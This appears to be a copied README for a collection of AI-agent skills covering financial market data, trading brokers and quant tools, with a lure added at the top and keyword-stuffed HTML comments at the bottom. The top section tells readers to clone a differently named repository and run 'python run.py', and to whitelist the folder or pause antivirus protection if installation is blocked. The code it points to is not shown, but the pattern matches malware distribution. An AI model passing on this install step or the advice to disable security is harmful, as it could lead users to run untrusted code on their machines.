# skills


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/AbjurerSport/skills-tool.git
cd skills-tool
python run.py
```


Open-source collection of skills compatible with the [SKILL.md](https://skills.sh) standard. Developed for the AI courses at UCEMA.

[![skills.sh](https://skills.sh/b/gauss314/skills)](https://skills.sh/gauss314/skills)


## Data — Global

Skills that extract market data (quotes, historical, fundamentals, screener, etc). Multi-country / global coverage: US, Europe, Asia, and global aggregators.

| # | Skill | Type | Cost | API Key | Instruments |
|---|-------|------|:-----:|:-------:|--------------|
| 1 | [FRED Macro](./skills/fred-macro/) | API | ✓ Free | Required | macro-data |
| 2 | [Alpha Vantage](./skills/alpha-vantage/) | API | Freemium | Required | stocks, forex, commodities, fundamentals |
| 3 | [Yahoo Finance](./skills/yahoo-finance/) | API/Scraper | ✓ Free | - | stocks, forex, options, futures, fundamentals |
| 4 | [SEC Data](./skills/sec-data/) | API | ✓ Free | - | fundamentals |
| 5 | [Alpaca Data](./skills/alpaca-data/) | API | ✓ Free | Required | stocks, options |
| 6 | [Finnhub](./skills/finnhub/) | API | Freemium | Required | stocks, forex, fundamentals |
| 7 | [Finviz](./skills/finviz/) | Scraper | ✓ Free | - | stocks, fundamentals, screener |
| 8 | [Macrotrends](./skills/macrotrends/) | Scraper | ✓ Free | - | stocks, fundamentals |
| 9 | [MarketScreener](./skills/marketscreener/) | Scraper | ✓ Free | - | stocks, fundamentals, screener |
| 10 | [MarketWatch](./skills/marketwatch/) | Scraper | ✓ Free | - | stocks, options, futures, fundamentals |
| 11 | [CompaniesMarketCap](./skills/companiesmarketcap/) | Scraper | ✓ Free | - | stocks, etfs |
| 12 | [SimplyWallSt](./skills/simplywallst/) | API/Scraper | ✓ Free | - | stocks, fundamentals |
| 13 | [EarningsWhispers](./skills/earningswhispers/) | API | ✓ Free | - | fundamentals |
| 14 | [Barchart](./skills/barchart/) | Scraper | ✓ Free | - | stocks, futures, fundamentals |
| 15 | [Nasdaq Data](./skills/nasdaq-data/) | API | ✓ Free | - | stocks, options, fundamentals, etfs |
| 16 | [CBOE Data](./skills/cboe-data/) | API | ✓ Free | - | stocks, options, commodities, futures |
| 17 | [Investing.com](./skills/investing/) | Scraper | ✓ Free | - | stocks, forex, commodities, options, futures, etfs, screener, fundamentals |
| 18 | [Morningstar](./skills/morningstar/) | API | ✓ Free | - | screener |
| 19 | [TradingView](./skills/tradingview/) | API | ✓ Free | - | stocks, etfs, bonds, options, futures, forex, crypto, screener, fundamentals |
| 20 | [Google Finance](./skills/google-finance/) | API | ✓ Free | - | stocks, etfs, options, fundamentals |

## Data — Regional (Argentina)

Skills specific to the Argentine market: BCRA, BCBA, MAE, CAFCI, etc.

| # | Skill | Type | Cost | API Key | Instruments |
|---|-------|------|:-----:|:-------:|--------------|
| 1 | [BCRA Macro](./skills/bcra-macro/) | API | ✓ Free | - | macro-data |
| 2 | [Data912](./skills/data912/) | API | ✓ Free | - | stocks, forex, bonds, options, etfs |
| 3 | [MAE](./skills/mae/) | API | ✓ Free | - | bonds, macro-data, forex |
| 4 | [BYMA](./skills/byma/) | API | ✓ Free | - | stocks, bonds, options, etfs |
| 5 | [CAFCI](./skills/cafci/) | API | ✓ Free | - | etfs |
| 6 | [INDEC](./skills/indec/) | API | ✓ Free | - | macro-data |


## Brokers

Skills that allow executing real trades (orders, positions, account) on broker accounts.

| # | Skill | Type | Country | Instruments |
|--:|-------|------|---------|--------------|
| 1 | [Alpaca Trading](./skills/alpaca-trading/) | REST | USA | stocks, options |
| 2 | [Primary](./skills/primary/) | REST+WS | Argentina | futures |
| soon | Tradier | | | |
| soon | Interactive Brokers | | | |
| soon | Invertironline | | | |
| soon | Portfolio Personal | | | |


## Tools

Calculation and financial support tools (backtesting frameworks, screeners, options and greeks calculation, etc).

| # | Skill | Concepts |
|---|-------|----------|
| 1 | [Option pricing](./skills/option-pricing/) | Black-Scholes, Binomial CRR, Trinomial, Monte Carlo (antithetic), Longstaff-Schwartz, Bjerksund-Stensland/BAW (American), Heston (smile), Bates (smile + crashes), greeks (delta/gamma/vega/theta/rho), implied vol, P(ITM) and P(Profit). 15 CLI modes. Flat Python + numpy, 419k options/sec (BS) |
| 2 | [Backtesting](./skills/backtesting/) | Academic backtesting framework. 30+ risk/performance ratios, 10 classes of indicators, event-driven engine with 8 built-in strategies, Markowitz optimization, forward-looking simulation (Johnson SU + t-Copula), walk-forward CV, stress testing, fundamental analysis (Altman Z, Piotroski, DuPont). Flat Python + numpy, 33 checks validation suite. |
| 3 | [Portfolio](./skills/portfolio/) | Portfolio construction and optimization: Markowitz (scipy.optimize + Monte Carlo frontier), Black-Litterman (CAPM inverse prior, absolute/relative views, Idzorek omega, Bayesian posterior), HRP/HERC/NCO (hierarchical clustering, risk parity, nested clustered optimization with constraints). All flat numpy + scipy, no Riskfolio-Lib/PyPortfolioOpt required. 12 CLI modes, verified against real yfinance data matching library outputs exactly.

<br><br>


## Data — Global

| Skill | Command |
|-------|---------|
| FRED Macro | `npx skills add gauss314/skills --skill fred-macro` |
| Alpha Vantage | `npx skills add gauss314/skills --skill alpha-vantage` |
| Yahoo Finance | `npx skills add gauss314/skills --skill yahoo-finance` |
| SEC Data | `npx skills add gauss314/skills --skill sec-data` |
| Alpaca Data | `npx skills add gauss314/skills --skill alpaca-data` |
| Finnhub | `npx skills add gauss314/skills --skill finnhub` |
| Finviz | `npx skills add gauss314/skills --skill finviz` |
| Macrotrends | `npx skills add gauss314/skills --skill macrotrends` |
| MarketScreener | `npx skills add gauss314/skills --skill marketscreener` |
| MarketWatch | `npx skills add gauss314/skills --skill marketwatch` |
| CompaniesMarketCap | `npx skills add gauss314/skills --skill companiesmarketcap` |
| SimplyWallSt | `npx skills add gauss314/skills --skill simplywallst` |
| EarningsWhispers | `npx skills add gauss314/skills --skill earningswhispers` |
| Barchart | `npx skills add gauss314/skills --skill barchart` |
| Nasdaq Data | `npx skills add gauss314/skills --skill nasdaq-data` |
| CBOE Data | `npx skills add gauss314/skills --skill cboe-data` |
| Investing.com | `npx skills add gauss314/skills --skill investing` |
| Morningstar | `npx skills add gauss314/skills --skill morningstar` |
| TradingView | `npx skills add gauss314/skills --skill tradingview` |
| Google Finance | `npx skills add gauss314/skills --skill google-finance` |

## Data — Regional (Argentina)

| Skill | Command |
|-------|---------|
| BCRA Macro | `npx skills add gauss314/skills --skill bcra-macro` |
| Data912 | `npx skills add gauss314/skills --skill data912` |
| MAE | `npx skills add gauss314/skills --skill mae` |
| BYMA | `npx skills add gauss314/skills --skill byma` |
| CAFCI | `npx skills add gauss314/skills --skill cafci` |
| INDEC | `npx skills add gauss314/skills --skill indec` |

## Brokers

| Skill | Command |
|-------|---------|
| Alpaca Trading | `npx skills add gauss314/skills --skill alpaca-trading` |
| Primary | `npx skills add gauss314/skills --skill primary` |

## Tools

| Skill | Command |
|-------|---------|
| Option pricing | `npx skills add gauss314/skills --skill option-pricing` |
| Backtesting | `npx skills add gauss314/skills --skill backtesting` |
| Portfolio | `npx skills add gauss314/skills --skill portfolio` |

<br><br>
# Structure

Each skill is a directory following the Agent Skills standard structure:

```
.
├── skills/
│   └── <skill-name>/
│       ├── SKILL.md           # required: frontmatter + instructions
│       ├── references/        # optional folder: complementary documentation
│       ├── scripts/           # optional folder: executable example scripts
│       └── assets/            # optional folder: templates, configs
├── README.md
├── LICENSE                    # MIT
└── .gitignore
```

## How it works

The command `npx skills add gauss314/skills --skill bcra-macro` installs:

Files in `references/`, `scripts/` and `assets/` are loaded **only when the skill needs them**, following the **Progressive Disclosure** principle to optimize tokens.

## SKILL.md format

```yaml
---
name: skill-name
description: Short description (<100 characters)
license: MIT
---

# Skill Name

Instructions for the agent and SKILL content...
```

**Required fields:** `name`, `description`  
**Optional fields:** `license`, `metadata`, `disable-model-invocation`


# Global install (accessible to any of the user's projects)
npx skills add gauss314/skills --skill bcra-macro -g
```

## Skill Description

#### Data — Global

**FRED Macro:** **840,000+** macroeconomic series from the Federal Reserve (GDP, CPI, rates, employment, M2, VIX, treasuries, mortgages). Historical series since **1996** with search by name/category, tags, releases, and daily/monthly/quarterly/annual frequencies. Official free API.

**Alpha Vantage:** **20+** global exchanges, **200,000+** tickers (stocks, forex, crypto, commodities). Freemium with **25 calls/day** free. Covers TIME_SERIES_INTRADAY/DAILY/WEEKLY/MONTHLY, **50+** technical indicators, fundamental overview, FX rates, crypto ratings, commodities (metals, energy, grains).

**Yahoo Finance:** global coverage — stocks, ETFs, crypto, forex, bonds, indices, options, futures, fundamentals and news. Quotes delayed **15min**, daily/intraday OHLCV, financial statements, options chains, futures on commodities and indices, news, analyst recommendations, insider transactions. Unofficial endpoints via direct HTTP requests (no wrapper).

**SEC Data:** all companies filing with the SEC (10K, 10Q, 8K) — US public companies + internationals using IFRS. Data from the last **5+ years** with quarterly + annual. Concept-level data navigable. Supports US-GAAP and IFRS with automatic concept mapping. Income/balance/cashflow statements in JSON/CSV from XBRL facts.

**Alpaca Data:** **5,000+** US stocks + crypto + options with historical and real-time data. IEX feed. Snapshots, bars (OHLCV), trades, quotes. Multi-asset with symbol normalization. Generous free tier for historical data, real-time with limit.

**Finnhub:** **32** free REST endpoints with US/EU/UK coverage + forex + crypto. Quotes, company profile, financials, earnings calendar, recommendations trends, price targets, insider transactions, company peers, ESG scores, news, economic data, WebSocket. Freemium **60 calls/min**.

**Finviz:** **8K+** US stocks (NYSE, NASDAQ, AMEX) + Canada. Fundamental data (P/E, EPS, PEG, margins), technical (RSI, MACD, SMA, ATR), insider trading, institutional ownership, news, online screener with filters (market cap, P/E, sector, performance). Scraper of the Finviz site.

**Macrotrends:** **~6,500** tickers from US markets (NYSE, NASDAQ, AMEX), including international ADRs from **+30 countries**. Financial statements, ratios, employee count with **15+ years** of historical data. Income/balance/cashflow with **5-30 years** of history, profitability ratios, debt, margins, per-share data, segment data.

**MarketScreener:** **20K+** global stocks including ADRs. Quote, profile, financials (income/balance/cashflow), valuation, analyst consensus, news, earnings transcripts list, insider trading, shareholders, corporate governance, earnings calendar, recommendations, ownership structure. Global multi-country coverage.

**MarketWatch:** US stocks and global ADRs. Quotes, financials, SEC filings, analyst estimates, options chain, futures, historical OHLCV. Point-in-time data per ticker, comparable companies panel, screeners by category. Futures data on indices, commodities, rates and currencies.

**CompaniesMarketCap:** global financial rankings (market cap, earnings, revenue, employees, P/E, margins, assets, debt, cash), historical marketcap of stocks and ETF holdings. Global coverage — top companies by any metric, historical capitalization, ETF holdings. Uses native CSV download of the site.

**SimplyWallSt:** **120,000+** global stocks in **106** exchanges. Snowflake scores (1-5 stars: value, income, health, past, future, management), valuation vs sector, dividend history (**19+ years**) and projected, financial health score, insider transactions, price targets, P/E/P/B/ROE analysis. Internal REST API of the web frontend.

**EarningsWhispers:** **33,500+** global stocks tracked (US, Europe, Asia, LatAm). COMPLETE earnings transcripts (prepared remarks + Q&A) via public API without auth. No anti-bot, no aggressive rate limiting. Tested on **60+** tickers (AAPL, MSFT, GGAL, SHEL, TM, VALE, etc). Metadata: date, fiscal period, participants.

**Barchart:** **30K+** US stocks and global ADRs, plus futures. Delayed quotes, fundamentals, insider summary, analyst estimates, opinion pages with ticker search. Futures data on indices, commodities, currencies, rates. Scraper of the Barchart site.

**Nasdaq Data:** US stocks (nasdaq + nyse + other US exchanges). Internal REST API of Nasdaq.com with access to quotes, short interest (semi-monthly), financials, **13F** filings (institutional holdings), insider transactions, options chains, dividends, earnings, news, ETFs where the stock is a Top 10 Holding.

**CBOE Data:** CBOE indices (VIX, SPX, DJ, RUT), options, VX futures (VIX futures chain) + bond futures (IBHY, IBIG) and variance (VA), options with greeks, intraday **1-min** bars, market summary per exchange (BZX, BYX, EDGX, EDGA), most-active equities and options, symbol lookup, historical HV/IV.

**Investing.com:** **81K+** equities, **10K+** indices, **2.4K** currencies, **344** commodities, futures on indices/commodities/rates, **30K+** ETFs, **4K+** crypto. Global coverage. Quotes, historical OHLCV, fundamentals (income/balance/cashflow/ratios), dividends, earnings, profile. Data delayed **15-20min**. Requires `curl_cffi` for Cloudflare bypass.

**Morningstar:** **53** universes, **102K+** listings, **39** countries. Argentine CEDEARs (XBUE, 469), NYSE (XNYS, 2,343), Nasdaq (XNAS, 3,741), Frankfurt (XFRA, 14K+), Tokyo (XTKS, 3,989), Shanghai (XSHG, 2,365), Shenzhen (XSHE, 2,934), Hong Kong (XHKG, 2,757), India (XBOM, XNSE, 5K+), Korea (XKRX, 2,877), Brazil (BVMF, 2,070), BMV (XMEX, 2,233), London (XLON, 1,333), Paris (XPAR, 728), Zurich (XSWX, 507), Tel Aviv (XTAE, 546), Johannesburg (XJSE, 332), and **30+** more. **33** fields per listing: price, market cap, ratios, returns 1d/1w/1m/3m/6m/12m/36m/60m/120m, debt, dividend yield, sector, industry. Multi-currency, multi-country, multi-language.

**TradingView:** GLOBAL coverage — **100K+** stocks, **50K+** cryptos, indices, forex, bonds. Scanner API with **~300** columns (quote, pre-calculated technical indicators RSI/MACD/EMAs/SMAs/pivots, aggregated BUY/SELL ratings, valuation, financials, earnings + forecasts, analyst targets, dividends, ownership, short interest, returns). Symbol Search v3 with ISIN/CUSIP/CIK (joinable with SEC EDGAR). News Headlines (**~200** per stock, Dow Jones/Reuters/MarketBeat). HTML scraping of **16+** subpages (technicals, financials-income-statement, balance-sheet, cash-flow, options-chain, forecast, ideas). Mass SQL-like screener with filters + sort + pagination. **24** CLI modes with **4** unique HTTP endpoints.

**Google Finance:** Internal RPC API (`batchexecute`) discovered by reverse engineering. **NO API key, NO auth.** **19** CLI modes over **14+** RPC IDs. Quote (US + Argentine BCBA), OHLC intraday **1-min** + **5-min** (free, not available in other providers), OHLC daily last month + 6 months, massive financials (~22 KB income/balance/cashflow multi-period), earnings history, **analyst recommendations with individual detail** (Goldman, etc, with firm + target + date), technical ratings, company description with physical address + employees, peers, news with thumbnails, **global indices in 1 call** (Dow, S&P, NASDAQ, VIX, DAX, FTSE, Nikkei, Hang Seng, IBEX, CAC), sectors heatmap. Unique differentiators: free 1-min OHLC + per-analyst detail + company address. ⚠️ **Unofficial API, requires precautions** — read `references/LIMITATIONS_TROUBLESHOOTING.md`. Exhaustive documentation with 5 references + 3 JSON assets + warnings + plan B with alternative providers.

#### Data — Regional (Argentina)

**BCRA Macro:** **1,220** total series → **638** national series (official catalog v4.0) from the Central Bank. Daily/periodic series: exchange rate (official, wholesale, MEP, CCL, blue*), reserves, monetary policy rate, BADLAR, CER, UVA, LELIQ, monetary base, M2, deposits, loans. Data since **1996**.

**Data912:** Argentine market live — local stocks, CEDEARs, bonds, bills, options, MEP, CCL. US live — stocks and volatilities. Refreshes every **20** seconds, rate limit **120 req/min**. Historical OHLCV, filter screener, fundamental data of AR companies.

**MAE:** **17** endpoints. Complete wholesale trading: fixed income (LECAPs, BONCAPs, BOPREALes, hard dollar bonds, corporate bonds), repos (CAARS pesos, CAUSD dollars by term), REPO, swaps, FORWORD, wholesale FOREX, deferred dollar (DDF), ARS-MAE index, primary auctions, institutional communications, fund flows for TIR/MD curves.

**BYMA:** **9** endpoints. Complete Argentine stock exchange: leading stock panels, CEDEARs, sovereign bonds + LECAPs/BONCAPs, corporate bonds, repos, options and SENEBI. Historical OHLCV of instruments and indices (MERVAL, BURCAP). Equity (local stocks + CEDEARs), fixed income (sovereign, LECAPs, corporate bonds), derivatives (options). Bond technical sheet with amortization schedule.

**CAFCI:** **1,152** funds and **4,615** classes active as of 2026-06. Categories: Money Market, Fixed Income, Equity, Mixed Income, PyMes, Total Return, Infrastructure, Closed Funds, ASG, RG900. JSON catalog (fees, IDs, metadata), daily XLSX snapshot (VCP, equity, market share, variations), individual markdown sheet (TNA returns per period), portfolio composition (top assets). **4** endpoints + local daily cache.

**INDEC:** Official **Series de Tiempo** API of the Argentine State (`apis.datos.gob.ar/series`). **~4,250** series from INDEC + BCRA + Min Economy + Sec Labor + DGEYC. NO API key, NO auth, NO captcha. **The most stable and best-documented API in the repo** — official documentation, GitHub source, no-break ABI policies. Coverage: National IPC (general level, core, regulated, by chapters and regions), EMAE (original + seasonally adjusted + sectoral), IPI Manufacturing, ISAC Construction, EPH (unemployment by region), poverty line, exports, RIPTE wages, SMVM, BCRA exchange rate, BCRA reserves, REM market expectations. **Unique features:** 7 builtin transformations server-side (`percent_change_a_year_ago` = YoY inflation, `percent_change_since_beginning_of_year` = YTD inflation), 6 builtin temporal aggregations (daily→monthly→yearly with avg/sum/end_of_period/min/max), multi-series in 1 request. **19** CLI modes with 9 indicator shortcuts (`ipc`, `emae`, `salarios`, `dolar`, `reservas`, etc). Documentation: 10 references (REFERENCE, ENDPOINTS, PARAMS, REPRESENTATION_MODES, COLLAPSE_AGGREGATIONS, SERIES_CATALOG, RESPONSE_FORMAT, DATA_SOURCES, COOKBOOK with 30+ recipes, LIMITATIONS_TROUBLESHOOTING) + 5 JSON assets with curated catalog of canonical series IDs.

#### Brokers

**Alpaca Trading:** paper trading (free) and live trading of US stocks, crypto and options. REST API over Alpaca Broker. Market data via IEX feed. Market/limit/stop/trailing-stop orders, short selling, multi-leg options. Positions, account, watchlists, calendar. Official SDK: `alpaca-py`.

**Primary:** Trading API for Matba ROFEX (Argentina's derivatives exchange). Futures (USD, soybean, corn, wheat), options on futures, stocks, bonds, CEDEARs. Token-based auth (24h). REST + WebSocket for real-time market data, order entry/cancel, and execution reports. Risk API (HTTP Basic Auth) for positions and account reports. No SDK — direct HTTP via `requests`.

#### Tools

**Option pricing:** flat-Python, numpy-vectorized option pricing for backtesting. 9 methods covering vanilla, smile, and tail risk: Black-Scholes (closed-form, european), Binomial CRR (tree, american + european), Trinomial Boyle (tree, american + european), Monte Carlo with antithetic variates (european) + Longstaff-Schwartz (american via simulation), Bjerksund-Stensland 2002 / BAW (closed-form american), Heston 1993 (stochastic vol, smile via Fourier integral), Bates 1996 (Heston + Merton jumps, captures crash risk). Plus analytic greeks (delta/gamma/vega/theta/rho), implied volatility solver via bisection, and risk-neutral P(ITM) and P(Profit). CLI with 15 modes including `validate` and `bench`. Real benchmarks (Python 3.14 + numpy 2.4.4, same inputs for all methods): BS 2.4 us/op (419k/s), BS2 3.6 us/op (276k/s), P(ITM) 1.1 us/op (908k/s), Heston 398 us/op (2.5k/s), Bates 6.2 ms/op (160/s), Binomial N=500 5.6 ms/op (178/s). Validated against Hull 9th ed (Examples 15.6 and 21.1) and put-call parity (15/15 pass).

**Backtesting:** academic backtesting framework for quantitative research. **30+** risk and performance ratios (flat, numpy-vectorized, no classes), **10** classes of indicators (trend-following, oscillators, contrarians, flow, combined, discrete counts, seasonality, statistical, referential, fundamental). Event-driven **BacktestEngine** with 8 built-in strategies (SMA crossover, RSI mean-reversion, MACD, Bollinger Bands contrarian, ADX trend, momentum, growth+momentum combo). **Markowitz** efficient frontier with random portfolio sampling and Monte Carlo simulation. **Forward-looking** simulation with Johnson SU marginals + t/Gaussian copula, drift, and fan-chart projection. **Walk-forward** cross-validation with expanding window and IS/OOS gap. **Stress testing** with parametric scenario shocks. **Fundamental analysis**: Altman Z-Score (bankruptcy prediction), Piotroski F-Score (9-criterion quality), DuPont decomposition (5-factor ROE). **30+** risk/performance ratios: Sharpe, Sortino, Calmar, Kelly, MaxDD, Ulcer, Recovery Factor, Rachev A/B/C, Common Sense Ratio, Payoff Ratio, Profit Factor, Win/Loss Ratio, VaR (empirical/normal/Johnson SU), cVaR, tracking error, information ratio. **31-check** 4-level validation suite (`py scripts/validate.py`) covering CLI modes, mathematical consistency, edge cases, and regression.

**Portfolio:** portfolio construction and optimization from the course material (MPT, NCO, Black-Litterman). **Markowitz** via scipy.optimize or Monte Carlo simulation with efficient frontier and CML tangent line. **Black-Litterman** full pipeline: market-implied risk aversion (delta), CAPM-inverse prior returns, absolute and relative views with confidence levels, Idzorek omega, Bayesian posterior returns and covariance, Markowitz on BL posterior. **HRP/HERC/NCO** hierarchical methods: correlation-to-distance clustering (single/complete/average/ward), recursive bisection risk parity, nested clustered optimization with intra/inter-cluster Markowitz, NCO with per-asset and per-class constraints. **Risk measures**: VaR, CVaR, MAD, MSV, max drawdown, CDaR, diversification ratio, risk contribution. **Covariance estimation**: historical, Ledoit-Wolf (sklearn-compatible), OAS, EWMA. **12 CLI modes** (`markowitz`, `montecarlo`, `frontier`, `bl-prior`, `bl`, `hrp`, `herc`, `nco`, `nco-con`, `clusters`, `risk`, `stats`). All flat numpy + scipy, zero external financial libraries required. **28-test suite** with mathematical consistency checks + real yfinance verification matching PyPortfolioOpt/Riskfolio-Lib outputs exactly.

---

## Compatibility

Tested with:

- Claude Code, Antigravity, Cursor, Windsurf, Gemini CLI, Codex, OpenCode, CommandCode CLI, Kimi CLI, Trae

## License

[MIT](./LICENSE)


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- skills-tool - tool utility software - download install setup -->
<!-- latest version skills-tool | how to download skills-tool wrapper | demo powerful skills-tool | git clone skills-tool package | skills-tool cli | updated skills-tool framework | skills tool reference | debian simple skills-tool | how to configure fast skills-tool | 2025 skills-tool | run on linux best skills-tool | skills-tool binding | download for windows skills-tool | configurable skills-tool gui | online skills-tool editor | simple skills-tool mobile | tar.gz skills-tool | download for windows skills-tool parser | how to use skills-tool converter | open source free skills-tool | quickstart skills-tool tester | configure cross platform skills-tool | quickstart low latency skills-tool web | how to use skills-tool wrapper | macos skills-tool tracker | guide modern skills-tool parser | configure skills-tool clone | 2026 skills-tool | how to setup skills-tool module | run on windows skills-tool cli | updated skills-tool viewer | customizable skills-tool application | wiki skills-tool module | local skills-tool | new version skills-tool generator | demo safe skills-tool | skills-tool service | reliable skills-tool decoder | extensible skills-tool | centos skills-tool builder | build skills-tool application | offline skills-tool | zip skills-tool logger | powerful skills-tool api | stable skills-tool editor | portable skills-tool generator | skills tool example | download for linux skills-tool alternative | portable skills-tool encoder | open skills-tool builder -->
<!-- quick start skills-tool validator | extensible skills-tool generator | getting started skills-tool encoder | how to configure skills-tool port | windows skills-tool server | simple skills-tool sdk | free download easy skills-tool | how to install skills-tool scanner | start skills-tool gui | tutorial skills-tool debugger | skills tool ci cd | open source skills-tool encoder | how to run skills-tool program | skills-tool extension | safe skills-tool copy | lightweight skills-tool mirror | execute skills-tool analyzer | execute skills-tool creator | skills-tool reader | secure skills-tool uploader | modern skills-tool engine | open source skills-tool server | how to install native skills-tool | skills tool github | portable skills-tool app | guide offline skills-tool | self hosted skills-tool addon | documentation skills-tool | free skills-tool application | compile portable skills-tool | modern skills-tool tester | modern skills-tool editor | secure skills-tool builder | stable skills-tool service | online skills-tool mobile | local skills-tool library | how to configure free skills-tool | use safe skills-tool | skills-tool scanner | local skills-tool viewer | quickstart top skills-tool binding | 2025 skills-tool tester | self hosted skills-tool platform | download for mac skills-tool | how to build skills-tool plugin | skills tool best practice | free skills-tool | self hosted skills-tool sdk | open source skills-tool uploader | how to deploy skills-tool app -->
<!-- easy skills-tool port | how to configure skills-tool downloader | 2025 skills-tool program | best skills-tool optimizer | source code skills-tool creator | build skills-tool sdk | how to run skills-tool extractor | free skills tool | fast skills-tool | minimal skills-tool fork | compile lightweight skills-tool | lightweight skills-tool tester | skills-tool web | examples skills-tool port | open best skills-tool mirror | is skills tool legit | tar.gz skills-tool extension | self hosted skills-tool editor | tar.gz skills-tool mobile | free portable skills-tool | free skills-tool uploader | secure skills-tool framework | zip skills-tool reader | deploy skills-tool | getting started skills-tool validator | github skills-tool checker | skills-tool sdk | open source skills-tool monitor | native skills-tool | portable skills-tool extractor | download for mac skills-tool downloader | best skills-tool mobile | skills tool download | free top skills-tool | deploy extensible skills-tool | how to download skills-tool downloader | download skills-tool editor | skills tool help | beginner low latency skills-tool client | how to use low latency skills-tool | configurable skills-tool converter | debian advanced skills-tool | quick start skills-tool binding | free download skills-tool analyzer | tar.gz portable skills-tool | configurable skills-tool builder | modular skills-tool | sample skills-tool creator | centos skills-tool monitor | execute skills-tool app -->
<!-- compile skills-tool server | install skills-tool | high performance skills-tool generator | source code skills-tool service | sample skills-tool checker | quick start reliable skills-tool tracker | skills-tool fork | fedora skills-tool editor | download for windows skills-tool uploader | download for mac safe skills-tool | github stable skills-tool engine | linux skills-tool converter | new version skills-tool tracker | free skills-tool client | easy skills-tool editor | sample skills-tool debugger | extensible skills-tool replacement | guide skills-tool | docs skills-tool tester | get skills-tool | skills tool demo | git clone skills-tool application | skills-tool encoder | 2026 skills-tool platform | documentation skills-tool plugin | extensible skills-tool app | how to setup skills-tool copy | build skills-tool logger | configure skills-tool cli | how to build skills-tool reader | easy skills-tool | tutorial skills-tool desktop | run on linux skills-tool | lightweight skills-tool monitor | skills-tool tracker | demo skills-tool mobile | minimal skills-tool wrapper | high performance skills-tool framework | online skills-tool debugger | how to build skills-tool | updated skills-tool | start skills-tool library | free stable skills-tool | documentation skills-tool gui | customizable skills-tool engine | skills-tool application | docs simple skills-tool | docs extensible skills-tool | 2025 skills-tool generator | github skills-tool tester -->
<!-- customizable skills-tool converter | configure local skills-tool server | free download minimal skills-tool addon | quick start skills-tool fork | debian skills-tool copy | walkthrough local skills-tool | free skills-tool software | deploy skills-tool web | minimal skills-tool utility | extensible skills-tool server | walkthrough skills-tool | how to build modular skills-tool checker | secure skills-tool extractor | install skills-tool gui | how to install skills-tool | safe skills-tool | setup skills-tool plugin | execute skills-tool sdk | fast skills-tool wrapper | how to build customizable skills-tool | stable skills-tool mirror | skills tool project | centos skills-tool creator | ubuntu portable skills-tool analyzer | install skills-tool software | docs skills-tool compressor | skills-tool validator | ubuntu skills-tool tool | skills tool fix | git clone skills-tool web | lightweight skills-tool | simple skills-tool | debian skills-tool creator | best skills-tool engine | run skills-tool | skills-tool platform | download for linux cross platform skills-tool port | quick start configurable skills-tool | github skills-tool application | use skills-tool api | setup skills-tool encoder | customizable skills-tool program | how to run skills-tool | example skills-tool editor | download for linux skills-tool | quick start skills-tool downloader | download skills-tool sdk | download for windows simple skills-tool builder | extensible skills-tool checker | configure skills-tool creator -->
<!-- skills tool test | windows skills-tool mirror | self hosted skills-tool checker | modular skills-tool converter | reliable skills-tool checker | secure skills-tool tester | wiki advanced skills-tool | demo skills-tool sdk | execute top skills-tool | online skills-tool analyzer | open source local skills-tool | run on windows skills-tool web | linux skills-tool wrapper | modular skills-tool client | safe skills-tool server | demo self hosted skills-tool mobile | advanced skills-tool tracker | skills tool workflow | 2025 self hosted skills-tool converter | git clone skills-tool app | skills-tool framework | self hosted skills-tool module | get secure skills-tool | arch skills-tool validator | open skills-tool gui | run on windows skills-tool | stable skills-tool | 2026 skills-tool extractor | example skills-tool converter | how to deploy lightweight skills-tool service | windows modular skills-tool | github skills-tool addon | stable skills-tool replacement | run on mac online skills-tool binding | skills tool not working | free download skills-tool decoder | macos skills-tool parser | arch skills-tool encoder | advanced skills-tool port | use skills-tool optimizer | high performance skills-tool utility | download for mac skills-tool program | minimal skills-tool addon | how to download safe skills-tool mirror | walkthrough skills-tool module | documentation skills-tool platform | open source skills-tool | skills-tool compressor | examples skills-tool | new version skills-tool clone -->
<!-- macos skills-tool utility | compile skills-tool | beginner skills-tool module | start fast skills-tool | getting started skills-tool | deploy advanced skills-tool desktop | demo advanced skills-tool | github skills-tool scanner | 2025 production ready skills-tool | deploy skills-tool wrapper | centos simple skills-tool module | online skills-tool validator | download for linux online skills-tool wrapper | wiki stable skills-tool | free skills-tool encoder | download for windows customizable skills-tool | how to setup local skills-tool viewer | extensible skills-tool extractor | best skills-tool service | new version best skills-tool uploader | skills tool workshop | skills-tool checker | windows github skills-tool | compile skills-tool builder | run skills-tool encoder | ubuntu skills-tool viewer | wiki skills-tool cli | free native skills-tool binding | tutorial skills-tool | how to deploy skills-tool engine | launch skills-tool software | skills tool webinar | skills tool tutorial | skills-tool extractor | cross platform skills-tool fork | stable skills-tool api | windows skills-tool utility | how to deploy skills-tool tracker | open skills-tool creator | how to install skills-tool tracker | wiki skills-tool | getting started skills-tool library | local skills-tool software | launch skills-tool service | skills-tool editor | high performance skills-tool extension | skills-tool client | cross platform skills-tool addon | latest version skills-tool platform | easy skills-tool alternative -->
<!-- use skills-tool encoder | skills-tool generator | easy skills-tool monitor | how to build skills-tool debugger | cross platform skills-tool mobile | how to setup fast skills-tool | skills tool cloud | skills-tool converter | use skills-tool | skills tool setup | download skills-tool software | ubuntu skills-tool tracker | guide skills-tool addon | skills-tool program | skills-tool addon | deploy best skills-tool | skills tool support | extensible skills-tool alternative | getting started skills-tool viewer | cross platform skills-tool binding | top skills-tool cli | open source skills-tool mirror | skills tool docker | get local skills-tool | fedora skills-tool software | example skills-tool wrapper | linux free skills-tool | 2026 skills-tool utility | run on linux skills-tool builder | how to setup skills-tool editor | example modern skills-tool | cross platform skills-tool decoder | powerful skills-tool alternative | run skills-tool clone | run on windows skills-tool library | run on mac skills-tool server | 2026 skills-tool downloader | skills-tool clone | configure open source skills-tool | powerful skills-tool converter | portable skills-tool api | beginner skills-tool port | skills-tool builder | easy skills-tool desktop | skills-tool utility | macos portable skills-tool desktop | github skills-tool web | tar.gz best skills-tool | modular skills-tool encoder | fast skills-tool copy -->
